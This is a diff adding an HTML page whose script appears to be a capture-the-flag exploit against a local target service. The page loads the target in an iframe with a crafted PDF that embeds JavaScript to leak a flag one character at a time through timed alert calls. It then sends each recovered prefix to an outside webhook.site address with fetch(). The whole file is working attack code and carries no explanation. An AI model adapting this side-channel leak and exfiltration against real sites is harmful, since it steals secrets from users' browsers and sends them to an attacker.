@@ -1,0 +1,69 @@
+<a id=f >sdf</a>
+<div id=t >
+	
+</div>
+<script>
+function addFrame(src,h){
+	let el = document.createElement('iframe')
+	el.src = src
+	el.onload = h
+	t.innerHTML = ''
+	t.appendChild(el)
+}
+
+let target = 'http://web:8000'
+let pdfFile = '%25PDF-1.3%0A1%200%20obj%0A%3C%3C%2FPages%202%200%20R%20%2FType%20%2FCatalog%3E%3E%0Aendobj%0A2%200%20obj%0A%3C%3C%2FCount%201%20%2FKids%20%5B3%200%20R%5D%20%2FType%20%2FPages%3E%3E%0Aendobj%0A3%200%20obj%0A%3C%3C%2FAA%0A%20%20%3C%3C%2FO%0A%20%20%3C%3C%2FJS%0A%20%20(%0Atry%20%7B%0A%20%20$SCRIPT$%0A%0A%7D%20catch%20%5C(e%5C)%20%7B%0A%20%20app.alert%5C(e.message%5C)%3B%0A%7D%0A%20%20%20%20)%0A%20%20%2FS%20%2FJavaScript%3E%3E%3E%3E%0A%20%20%2FAnnots%20%5B%5D%20%2FContents%204%200%20R%20%2FMediaBox%20%5B0%200%20612%20792%5D%20%2FParent%202%200%20R%0A%20%20%2FResources%0A%20%20%3C%3C%2FFont%20%3C%3C%2FF1%20%3C%3C%2FBaseFont%20%2FHelvetica%20%2FSubtype%20%2FType1%20%2FType%20%2FFont%3E%3E%3E%3E%3E%3E%0A%20%20%2FType%20%2FPage%3E%3E%0Aendobj%0A4%200%20obj%0A%3C%3C%2FLength%2021%3E%3E%0Astream%0A%0ABT%0A%2FF1%2024%20Tf%0AET%0A%20%20%20%20%0Aendstream%0Aendobj%0Axref%0A0%205%0A0000000000%2065535%20f%0A0000000015%2000000%20n%0A0000000062%2000000%20n%0A0000000117%2000000%20n%0A0000000416%2000000%20n%0Atrailer%0A%0A%3C%3C%2FRoot%201%200%20R%20%2FSize%205%3E%3E%0Astartxref%0A485%0A%25%25EOF%0A'
+var alphabet = "abcdef0123456789"
+async function testChar(){
+	let sc = `
+	var flag = \`$gift$\`
+	var leaked = 0
+	function mom(){
+		var a = flag[25+leaked]
+		if(a == "}"){
+			return;
+		}
+		var alphabet = "abcdef0123456789"
+		var idx = 0;
+		for(var i=0;i<0x10;i++){
+			if(alphabet[i] == a){
+				idx = i+1
+				break
+			}
+		}
+		for(var i=0;i<idx;i++){
+			app.alert(1337)
+		}
+		app.setTimeOut('leaked += 1;app.alert(leaked);mom()',1000)
+	}
+	mom()
+	`
+	sc = pdfFile.replace('$SCRIPT$',encodeURIComponent(sc))
+	addFrame(`${target}/?letter=${sc}&content_type=application/pdf&0`,_=>{
+		setTimeout(_=>{
+			lchar()
+		},5000)
+	})
+}
+window.flag = ''
+async function lchar(){
+	window.num = 0
+	window.val = setInterval(_=>{
+		let prev = performance.now()
+		alert()
+		if(performance.now()-prev > 500){
+			window.flag += alphabet[window.num]
+			fetch('https://webhook.site/04d176a1-8673-4712-aa32-e6ff83e5c617?a='+window.flag)
+			alert(window.flag)
+			window.clearInterval(window.val)
+			lchar()
+			return
+		}
+		window.num += 1
+	},50)
+
+}
+testChar()
+
+
+</script>
